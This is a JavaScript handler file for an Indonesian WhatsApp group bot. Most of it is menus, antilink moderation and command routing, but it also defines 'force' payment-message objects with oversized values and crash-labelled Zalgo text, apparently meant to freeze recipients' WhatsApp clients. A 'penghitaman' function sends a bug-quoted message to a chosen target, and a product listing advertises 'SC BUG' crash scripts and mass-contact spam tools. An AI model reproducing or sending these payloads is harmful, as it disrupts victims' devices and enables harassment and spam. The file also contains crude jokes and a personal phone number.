module.exports = async (Reza, m, store) => {
  try {
    const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

    //========== DATABASE ===========//
    const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
    const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
    const welcome = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
    const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
    const premium = JSON.parse(fs.readFileSync("./all/database/premium.json"))
    const owner2 = JSON.parse(fs.readFileSync("./all/database/owner.json"))
    const teksjpm = fs.readFileSync("./list/teksjpm.js").toString()
    const hargamarket = fs.readFileSync("./list/hargamarket.js").toString()
    const hargapanel = fs.readFileSync("./list/hargapanel.js").toString()
    const harganokos = fs.readFileSync("./list/harganokos.js").toString()
    const hargavps = fs.readFileSync("./list/hargavps.js").toString()
    const hargadomain = fs.readFileSync("./list/hargadomain.js").toString()
    const hargasuntik = fs.readFileSync("./list/hargasuntik.js").toString()
    const isPremium = premium.includes(m.sender)
    const bucin = require('./all/database/bucin.json')
    const grupgenius = require('./all/database/grup.json')
    const idolnurse = require('./all/database/idolnurse.json')
    const ambassador = require('./all/database/ambassador.json')
    const techsmith = require('./all/database/techsmith.json')
    const eselon = require('./all/database/eselon.json')
    const sa = require('./all/database/sa.json')
    const staffgeniuscontact = require('./all/database/staffgeniuscontact.json')

    //========= CONFIGURASI ==========//
    const budy = (typeof m.text == 'string' ? m.text : '')
    const isOwner = owner2.includes(m.sender) ? true : m.sender == owner + "@s.whatsapp.net" ? true : m.fromMe ? true : false
    const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : isOwner && !m.isBaileys ? '' : '.'
    const isCmd = body.startsWith(prefix)
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
    const cmd = prefix + command
    const args = body.trim().split(/ +/).slice(1)
    var crypto = require("crypto")
    let { randomBytes } = require("crypto")
    const makeid = randomBytes(3).toString('hex')
    const quoted = m.quoted ? m.quoted : m
    const mime = (quoted.msg || quoted).mimetype || ''
    const qmsg = (quoted.msg || quoted)
    const text = q = args.join(" ")
    const botNumber = await Reza.decodeJid(Reza.user.id)
    const isGroup = m.chat.endsWith('@g.us')
    const senderNumber = m.sender.split('@')[0]
    const pushname = m.pushName || `${senderNumber}`
    const isBot = botNumber.includes(senderNumber)
    const groupMetadata = m.isGroup ? await Reza.groupMetadata(m.chat).catch(e => { }) : {}
    let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
    let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
    const isBotAdmin = participant_bot?.admin !== null ? true : false
    const isAdmin = participant_sender?.admin !== null ? true : false
    const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, pickRandom, getRandom2 } = require('./all/function.js')
    const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")

    //=========== MESSAGE ===========//
    if (isCmd) {
      console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
    }

    //========= FAKE QUOTED =========//
    const qbug = {
      key: { remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net' }, message: {
        listResponseMessage: {
          title: `Hello My Friends`
        }
      }
    }

    const qtext = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}) }, 'message': { extendedTextMessage: { text: "Thank you for using my services" } } }

    const qdoc = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { documentMessage: { title: `Powered By ${namaowner}`, jpegThumbnail: "" } } }

    const qloc = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { locationMessage: { name: `WhatsApp Bot JPM By Skzyoo`, jpegThumbnail: "" } } }

    const qcall = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      'message': {
        "eventMessage": {
          "isCanceled": false,
          "name": `${namabot} Project`,
          "description": "Pe",
          "location": {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "name": "Apakajajanabs"
          },
          "joinLink": "https://chat.whatsapp.com/KcOsY5C3KzuD9PQ396vRfq",
          "startTime": "1713724680"
        }
      }
    }

    const qloc2 = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { locationMessage: { name: `WhatsApp Bot Pushkontak By SlimexTzy`, jpegThumbnail: "" } } }

    const qkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(botNumber ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        'contactMessage': {
          'displayName': `${namaowner}`,
          'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
          sendEphemeral: true
        }
      }
    }

    const qpayment = {
      key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        id: `ownername`,
        participant: '0@s.whatsapp.net'
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "IDR",
          amount1000: 999999999,
          requestFrom: '0@s.whatsapp.net',
          noteMessage: {
            extendedTextMessage: {
              text: namabot
            }
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "INR"
          }
        }
      }
    }

    const qchanel = {
      key: {
        remoteJid: 'status@broadcast',
        fromMe: false,
        participant: '0@s.whatsapp.net'
      },
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `120363224727390375@newsletter`,
          newsletterName: `Hore`,
          jpegThumbnail: "",
          caption: `Powered By ${namaowner2}`,
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }

    const qtoko = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      }, message: {
        "productMessage": {
          "product": {
            "productImage": {
              "mimetype": "image/jpeg",
              "jpegThumbnail": "",
            },
            "title": `${namaowner2} - Marketplace`,
            "description": null,
            "currencyCode": "IDR",
            "priceAmount1000": "999999999999999",
            "retailerId": `Powered By SlimexTzy`,
            "productImageCount": 1
          },
          "businessOwnerJid": `0@s.whatsapp.net`
        }
      }
    }

    const force = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      'message': {
        "interactiveMessage": {
          "header": {
            "hasMediaAttachment": true,
            "jpegThumbnail": await fs.readFileSync(`./media/menu.jpg`)
          },
          "nativeFlowMessage": {
            "buttons": [
              {
                "name": "review_and_pay",
                "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
              }]
          }
        }
      }
    }

    const force2 = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      'message': {
        "interactiveMessage": {
          "header": {
            "hasMediaAttachment": true,
            "jpegThumbnail": fs.readFileSync(`./media/menu.jpg`)
          },
          "nativeFlowMessage": {
            "buttons": [
              {
                "name": "review_and_pay",
                "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
              }]
          }
        }
      }
    }


    //========== FUNCTION ===========//
    let ppuser
    try {
      ppuser = await Reza.profilePictureUrl(m.sender, 'image')
    } catch (err) {
      ppuser = 'https://telegra.ph/file/05dcbeb5ba659917a2417.jpg'
    }

    async function SendWebView(teks, urlnya) {
      let pe = {
        viewOnceMessage: {
          message: {
            "messageContextInfo": {
              "deviceListMetadata": {},
              "deviceListMetadataVersion": 2
            },
            "interactiveMessage": {
              "body": {
                "text": teks
              },
              "nativeFlowMessage": {
                "buttons": [{
                  "name": "open_webview",
                  "buttonParamsJson": `{\"link\":{\"in_app_webview\":true,\"url\":\"${urlnya}\",\"success_url\":\"https://www.example.com/success\",\"cancel_url\":\"https://www.example.com/cancel\"}}`
                }],
                "messageParamsJson": ""
              }
            }
          }
        }
      }
      return Reza.relayMessage(m.chat, pe, {})
    }

    let example = (teks) => {
      return `*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
    }

    var resize = async (image, width, height) => {
      let oyy = await Jimp.read(image)
      let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
      return kiyomasa
    }

    function capital(string) {
      return string.charAt(0).toUpperCase() + string.slice(1);
    }

    const createSerial = (size) => {
      return crypto.randomBytes(size).toString('hex').slice(0, size)
    }

    async function SkyReply(teks, mention = []) {
      await Reza.sendMessage(m.chat, {
        text: `${teks}`, contextInfo: {
          mentionedJid: mention, externalAdReply: {
            thumbnail: fs.readFileSync("./media/reply.jpg"), title: "© ꜱʟɪᴍᴇxᴛᴢʏ V0.0.5", body: `Powered By SlimexTzy.`,
            sourceUrl: waowner, previewType: "PHOTO"
          }
        }
      }, { quoted: m })
    }

    async function penghitaman(target, kuwoted = qbug) {
      var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        "stickerMessage": {
          "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          "mimetype": "image/webp",
          "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          "fileLength": "10116",
          "mediaKeyTimestamp": "1715876003",
          "isAnimated": false,
          "stickerSentTs": "1715881084144",
          "isAvatar": false,
          "isAiSticker": false,
          "isLottie": false
        }
      }), { userJid: target, quoted: kuwoted });
      await Reza.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
    }

    //========= SETTING EVENT ========//
    if (global.owneroff && !isCmd) {
      if (!isGroup && !isOwner) {
        let teks = `*Hai Kak* @${m.sender.split('@')[0]}

Maaf *Ownerku Sedang Offline*, Silahkan Tunggu Owner Kembali Online & Jangan Spam Chat`
        return Reza.sendMessage(m.chat, {
          text: `${teks}`, contextInfo: {
            mentionedJid: [m.sender], externalAdReply: {
              showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"
            }
          }
        }, { quoted: null })
      }
    }

    /*if (global.antibug) {
    if (!isGroup && m.isBaileys && !m.fromMe) {
    await Reza.sendMessage(m.chat, {
    delete: {
    remoteJid: m.chat, fromMe: true, id: m.key.id
    }})
    await Reza.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
    *Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
    }}*/

    if (antilink.includes(m.chat)) {
      if (!isBotAdmin) return
      if (!isAdmin && !isOwner && !m.fromMe) {
        var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
        if (link.test(m.text)) {
          var gclink = (`https://chat.whatsapp.com/` + await Reza.groupInviteCode(m.chat))
          var isLinkThisGc = new RegExp(gclink, 'i')
          var isgclink = isLinkThisGc.test(m.text)
          if (isgclink) return
          let delet = m.key.participant
          let bang = m.key.id
          await Reza.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: { mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: ppuser, title: "乂 Link Grup Terdeteksi", body: "Powered By " + namabot, previewType: "PHOTO" } } }, { quoted: m })
          await Reza.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet } })
          await Reza.groupParticipantsUpdate(m.chat, [m.sender], "remove")
        }
      }
    }

    if (antilink2.includes(m.chat)) {
      if (!isBotAdmin) return
      if (!isAdmin && !isOwner && !m.fromMe) {
        var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
        if (link.test(m.text)) {
          var gclink = (`https://chat.whatsapp.com/` + await Reza.groupInviteCode(m.chat))
          var isLinkThisGc = new RegExp(gclink, 'i')
          var isgclink = isLinkThisGc.test(m.text)
          if (isgclink) return
          let delet = m.key.participant
          let bang = m.key.id
          await Reza.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: { mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: ppuser, title: "乂 Link Grup Terdeteksi", body: "Powered By " + namabot, previewType: "PHOTO" } } }, { quoted: m })
          await Reza.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet } })
        }
      }
    }


    switch (command) {
      case "menu": {
        let teksnya = `*Haii* @${m.sender.split("@")[0]}!

Perkenalkan Saya *Telkom🇮🇩 Bot😎* By Divisi Techsmith💻 yang Siap Membantu Anda!

*乂 I N F O R M A T I O N*
◍ Botname : *${namabot2}*
◍ Uptime : *${runtime(process.uptime())}*
◍ Total Staff GENIUS: *27*

Daftar Menu:
.add
.kick
.addlore
.listlore
.hidetag
.tagall
.psg
.psg2
.smsg
.siaran
.siaran1
.techsmith
.idolnurse
.ambassador
.eselon
.grupgenius
.geniusstaffcontact`
        // let teksnya = 'aa'
        let msgii = generateWAMessageFromContent(m.chat,
          {
            //             viewOnceMessage: {
            //               message: {
            //                 "messageContextInfo": {
            //                   "deviceListMetadata": {},
            //                   "deviceListMetadataVersion": 2
            //                 },
            //                 interactiveMessage: proto.Message.InteractiveMessage.create({
            //                   body: proto.Message.InteractiveMessage.Body.create({
            //                     text: teksnya
            //                   }),
            //                   header: proto.Message.InteractiveMessage.Header.fromObject({
            //                     hasMediaAttachment: true,
            //                     documentMessage: {
            //                       "url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
            //                       "mimetype": "image/png",
            //                       "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
            //                       "jpegThumbnail": await fs.readFileSync("./media/menu.jpg"),
            //                       "fileLength": 120000,
            //                       "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
            //                       "fileName": `© SlimexTzy V5`,
            //                       "directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
            //                       "contactVcard": true,
            //                       "mediaKeyTimestamp": "1658703206"
            //                     }
            //                   }),
            //                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            //                     buttons: [{
            //                       "name": "single_select",
            //                       "buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih List Menu Di Bawah Ini", "rows": [{ "header": "All Command", "title": "List All Command Bot", "description": "© ${namabot2}", "id": ".slimeall" }, 
            // { "header": "Main Menu", "title": "List Main Menu Command", "description": "© ${namabot2}", "id": ".mainmenu" }, 
            // { "header": "Downloader", "title": "List Downloader Command", "description": "© ${namabot2}", "id": ".downloadmenu" }, 
            // { "header": "Converter", "title": "List Converter Command", "description": "© ${namabot2}", "id": ".convertmenu" }, 
            // { "header": "Pterodactyl Panel", "title": "List Pterodactyl Panel Command", "description": "© ${namabot2}", "id": ".panelmenu" }, 
            // { "header": "Domain Menu", "title": "List Domain Menu Command", "description": "© ${namabot2}", "id": ".domainmenu" }, 
            // { "header": "Store Menu", "title": "List Store Menu Command", "description": "© ${namabot2}", "id": ".storemenu" }, 
            // { "header": "Group Menu", "title": "List Group Menu Command", "description": "© ${namabot2}", "id": ".grupmenu" }, 
            // { "header": "Owner Menu", "title": "List Ownerbot Menu Command", "description": "© ${namabot2}", "id": ".ownermenu" }]}, { "title": "# Produk Owner Bot", "rows": [{ "header": "All Produk Owner", "title": "List All Produk Owner", "description": "© ${namabot2}", "id": ".produkmenu" }]}, { "title": "# Tools Owner Bot", "rows": [{ "header": "Auto Read", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".autoread" }, 
            // { "header": "Auto Read Story", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".autoreadsw" }, 
            // { "header": "Anti Call", "title": "Pilih Opsi ON/OFF", "description": "© ${namabot2}", "id": ".anticall" }]}]}`
            //                     },
            //                     {
            //                       "name": "cta_url",
            //                       "buttonParamsJson":
            //                         '{"display_text":"Owner 📲","url":"https:\\/\\/wa.me\\/6283807735938","webview_presentation":null}',
            //                     },
            //                     {
            //                       "name": "cta_url",
            //                       "buttonParamsJson": `{\"display_text\":\"Testimoni 📮\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
            //                     }]
            //                   }),
            //                   contextInfo: {
            //                     isForwarded: true,
            //                     mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
            //                     forwardedNewsletterMessageInfo: {
            //                       newsletterName: `Powered By ${namaowner2}`,
            //                       newsletterJid: global.idsaluran
            //                     }, externalAdReply: {
            //                       title: `Status : ${isOwner ? "Ownerbot" : isPremium ? "Premium" : "Gratisan"}`,
            //                       thumbnailUrl: ppuser,
            //                       body: `${ucapan()} ${m.pushName}`,
            //                       sourceUrl: linkyt,
            //                       previewType: "PHOTO"
            //                     }
            //                   }
            //                 })
            //               }
            //             }
          }, { userJid: m.sender, quoted: null })
        // await Reza.relayMessage(msgii.key.remoteJid, teksnya, {
        //   messageId: msgii.key.id
        // })
        var member = await groupMetadata.participants.map(e => e.id)
        Reza.sendMessage(m.chat, { text: teksnya })
      }
        break
      case 'cekkhodam': {
        if (!text) return m.reply("ketik nama lu anjg")

        const khodam = pickRandom([
          "Rajin coli",
          "2 Peler",
          "Kaleng Cat Avian",
          "Pipa Rucika",
          "Botol Tupperware",
          "Badut Mixue",
          "Sabun GIV",
          "Sandal Swallow",
          "Jarjit",
          "Ijat",
          "Fizi",
          "Mail",
          "Ehsan",
          "Upin",
          "Ipin",
          "sungut lele",
          "Tok Dalang",
          "Opah",
          "Opet",
          "Alul",
          "Pak Vinsen",
          "Maman Resing",
          "Pak RT",
          "Admin ETI",
          "Bung Towel",
          "Lumpia Basah",
          "Martabak Manis",
          "Baso Tahu",
          "Tahu Gejrot",
          "Dimsum",
          "Seblak Ceker",
          "Telor Gulung",
          "Tahu Aci",
          "Tempe Mendoan",
          "Nasi Kucing",
          "Kue Cubit",
          "Tahu Sumedang",
          "Nasi Uduk",
          "Wedang Ronde",
          "Kerupuk Udang",
          "Cilok",
          "Cilung",
          "Kue Sus",
          "Jasuke",
          "Seblak Makaroni",
          "Sate Padang",
          "Sayur Asem",
          "Kromboloni",
          "Marmut Pink",
          "Belalang Mullet",
          "Kucing Oren",
          "Lintah Terbang",
          "Singa Paddle Pop",
          "Macan Cisewu",
          "Vario Mber",
          "Beat Mber",
          "Supra Geter",
          "Oli Samping",
          "Knalpot Racing",
          "Jus Stroberi",
          "Jus Alpukat",
          "Alpukat Kocok",
          "Es Kopyor",
          "Es Jeruk",
          "Cappucino Cincau",
          "Jasjus Melon",
          "Teajus Apel",
          "Pop ice Mangga",
          "Teajus Gulabatu",
          "Air Selokan",
          "Air Kobokan",
          "TV Tabung",
          "Keran Air",
          "Tutup Panci",
          "Kotak Amal",
          "Tutup Termos",
          "Tutup Botol",
          "Kresek Item",
          "Kepala Casan",
          "Ban Serep",
          "Kursi Lipat",
          "Kursi Goyang",
          "Kulit Pisang",
          "Warung Madura",
          "Gorong-gorong",
        ])

        const response = `
  ╭━━━━°「 *Cekkhodam* 」°
┃   
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `

        m.reply(response)
      }





        break
      case 'produkslime': {
        const urldana = "https://telegra.ph/file/05dcbeb5ba659917a2417.jpg"
        const urlqris = "https://telegra.ph/file/05dcbeb5ba659917a2417.jpg"
        async function image(url) {
          const { imageMessage } = await generateWAMessageContent({
            image: {
              url
            }
          }, {
            upload: Reza.waUploadToServer
          })
          return imageMessage
        }


        let msg = generateWAMessageFromContent(
          m.chat,
          {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {},
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          imageMessage: await image(urldana),
                          hasMediaAttachment: true,
                        },
                        body: {
                          text: `ʟɪsᴛ ᴘᴀɴᴇʟ ʙʏ ꜱʟɪᴍᴇ⬇️

*📦 Ram 1GB Cpu 40%*
_Harga : Rp1000_

*📦 Ram 2GB Cpu 50%*
_Harga Rp2000_

*📦 Ram 3GB Cpu 60%*
_Harga : Rp3000_

*📦 Ram 4GB Cpu 80%*
_Harga : Rp4000_

*📦 Ram 5GB Cpu 110*
_Harga Rp5000_

*📦 Ram 6GB Cpu 120%* 
_Harha Rp6000_

*📦 Ram 7GB Cpu 130%* 
_Harga Rp7000_

*📦 Ram 8GB Cpu 150%* 
_Harga Rp8000_

*📦 Ram & Cpu Unlimited* 
_Harga Rp10.000_

*Keuntungan Panel :*
* SPEK VPS 16GB CORE 4*
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Bawa Bukti Transaksi!

*Ready Juga Resseller Panel ✅*
* *Harga :* Rp15.000/Bulan
* *Create Panel Lewat Bot*

*Ready Admin Panel Public/Private✅*
* *Harga :* Rp15.000/20.0000
* *Bisa Open Reseller Bosku*
* *Sc Anting Colong*
Minat ? wa.me/6283807735938` },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              "name": "cta_url",
                              "buttonParamsJson": '{"display_text":"BELI PRODUK SLIME","url":"https:\\/\\/wa.me\\/6283807735938","webview_presentation":null}',
                            },

                            {

                              "name": "cta_url",

                              "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                            },

                            {

                              "name": "cta_url",

                              "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`


                            },
                          ],
                        },
                      },
                      {
                        header: {
                          imageMessage: await image(urlqris),
                          hasMediaAttachment: true,
                        },
                        body: {
                          text: `*READY SC BY SLIMEXTZY*

> SC DELTA V2 8K

> SC DELTA V3 8K

> SC DELTA V4 10K

> SC DELTA V5 10K

> SC BUG QIO V9 8K

> SC BUG QIO V11 8K

> SC BUG QIO V13 10K

> SC BUG RXHL V4 10K

> SC DEVIL V2.0 10K

> SC DEVIL V2.1 15K

> SC DEVIL V2.2 20K

> SC DEVIL V2.3 25K

> SC DEVIL V3.0 30K

> SC BUG STRAVA V2.2 8K

> SC BUG STRAVA V2.5 8K

> SC BUG STRAVA V3.4 10K

> SC BUG STRAVA V4.0 15K

> SC BUG PRIVAT SLIME 15K

> SC PUSH VIP 10K

> SC INSTALL PANEL+WINGS+THEME+NODE 20K

> SC CPANEL+PUSH KONTAK+JPM SLIDE+PAYMENT SLIDE 20K

> SC BUTTON CPANEL STORE + JPM [NO ENC] 15K

> SC CPANEL PAYMENT SLIDE NO ENC 15K

> SC CPANEL SIMPEL 10K` },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson:
                                '{"display_text":"BELI PRODUK SLIME","url":"https:\\/\\/wa.me\\/6283807735938","webview_presentation":null}',
                            },

                            {

                              "name": "cta_url",

                              "buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`

                            },

                            {

                              "name": "cta_url",

                              "buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
                            },
                          ],
                        },
                      },

                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
          {}
        );

        await Reza.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id,
        });
      }

        break
      case "slimeall": {
        let teksmenu = ` *Haii* @${m.sender.split("@")[0]}!
 *Selamat ${ucapan()}*


 *乂 S L I M E M E N U*
> produkslime
> payment
> scbyslime
> slimecpanel
> slimecpanel2

*乂 M A I N M E N U*
> play
> tourl
> yts
> tohd
> chatgpt
> ai
> remini
> sticker
> listpremium
> pinterest
> qc
  
*乂 D O W N L O A D E R*
> tiktok
> tiktokmp3
> tiktokaudio
> tiktokslide
> instagram
> facebook
> ytmp3
> mediafire
  
*乂 C O N V E R T E R*
> toaudio
> tomp3
> tovn
> toptv
> tts
> toimage
  
*乂 P A N E L M E N U*
> addadmin
> addadmin2
> cpanel
> cpanel2
> listpanel
> listadmin
> deladmin
> delpanel
  
*乂 D O M A I N M E N U*
> listdomain
> listsubdomain
> delsubdomain
  
*乂 S T O R E M E N U*
> pushkontak
> pushkontak1
> pushkontak2
> savekontak
> savekontak2
> listgc
> idgc
> jpm
> jpm2
> jpmhidetag
> jpmhidetag2
> startjpm
> startjpmslide
> setteksjpm
> teksjpm

*乂 G R O U P M E N U*
> addmember
> antilink
> antilinkV2
> hidetag
> tagall
> delete
> open/close
> setnamagc
> setdeskgc
> setppgc
> kick
> promote
> leavegc
> leavegc2
> demote
  
*乂 O W N E R M E N U*
> addowner
> addpremium
> delpremium
> delowner
> listowner
> clearsession
> modeoff
> modeon
> done
> anticall
> autoread
> autoreadsw
> welcome
> getcase
> setppbotpanjang
> setppbot
> setnamabot
> setbiobot`
